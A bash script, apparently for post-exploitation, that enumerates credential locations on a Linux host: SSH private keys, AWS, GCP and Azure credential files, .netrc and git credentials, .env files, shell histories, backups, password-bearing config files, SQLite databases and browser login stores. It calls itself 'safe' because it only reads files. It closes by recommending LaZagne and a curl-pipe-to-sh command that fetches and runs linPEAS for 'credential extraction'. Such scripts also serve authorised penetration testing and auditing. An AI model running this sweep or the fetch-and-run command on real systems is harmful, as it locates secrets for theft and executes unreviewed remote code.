#!/bin/bash
# Find potential credentials in common locations
# This is a safe enumeration script - it only reads files

echo "=== CREDENTIAL ENUMERATION ==="
echo ""

# SSH keys
echo "[1] SSH KEYS"
find /home /root /tmp /var/tmp -name 'id_rsa*' -o -name 'id_dsa*' -o -name 'id_ecdsa*' -o -name 'id_ed25519*' 2>/dev/null
echo ""

# AWS credentials
echo "[2] AWS CREDENTIALS"
find /home /root -name 'credentials' -path '*/.aws/*' 2>/dev/null
find /home /root -name 'config' -path '*/.aws/*' 2>/dev/null
echo ""

# GCP credentials
echo "[3] GCP CREDENTIALS"
find /home /root -name '*.json' -path '*/gcloud/*' 2>/dev/null
echo ""

# Azure credentials
echo "[4] AZURE CREDENTIALS"
find /home /root -name 'azureCredentials.json' 2>/dev/null
echo ""

# Git credentials
echo "[5] GIT CREDENTIALS"
find /home /root -name '.netrc' -o -name '_netrc' 2>/dev/null
find /home /root -path '*/.git-credentials' 2>/dev/null
echo ""

# Browser passwords (encrypted, but worth noting)
echo "[6] BROWSER DATA LOCATIONS"
echo "Chrome: ~/.config/google-chrome/Default/Login Data"
echo "Firefox: ~/.mozilla/firefox/*/logins.json"
echo "Safari: ~/Library/Application Support/AddressBook/"
echo ""

# Database credentials in config files
echo "[7] DATABASE CONFIG FILES"
find /home /var/www /opt -name '*.conf' -o -name '*.cfg' -o -name '*.ini' 2>/dev/null | xargs grep -l -i 'password\|passwd\|pwd' 2>/dev/null | head -20
echo ""

# Environment files
echo "[8] ENVIRONMENT FILES"
find /home /var/www /opt -name '.env' -o -name 'env' 2>/dev/null | head -20
echo ""

# History files
echo "[9] SHELL HISTORY"
find /home /root -name '.bash_history' -o -name '.zsh_history' -o -name '.history' 2>/dev/null | head -10
echo ""

# Backup files with potential credentials
echo "[10] BACKUP FILES"
find /home /var/www /opt -name '*~' -o -name '*.bak' -o -name '*.old' -o -name '*.backup' 2>/dev/null | head -20
echo ""

# Files with 'password' in name
echo "[11] FILES WITH PASSWORD IN NAME"
find /home /var/www /opt -iname '*password*' 2>/dev/null | head -20
echo ""

# SQLite databases (may contain credentials)
echo "[12] SQLITE DATABASES"
find /home /var/www /opt -name '*.sqlite*' -o -name '*.db' 2>/dev/null | head -20
echo ""

echo "=== CREDENTIAL ENUMERATION COMPLETE ==="
echo ""
echo "For comprehensive credential extraction, consider:"
echo "- LinPEAS: curl -L https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/linPEAS.sh | sh"
echo "- LaZagne: https://github.com/AlessandroZ/LaZagne"
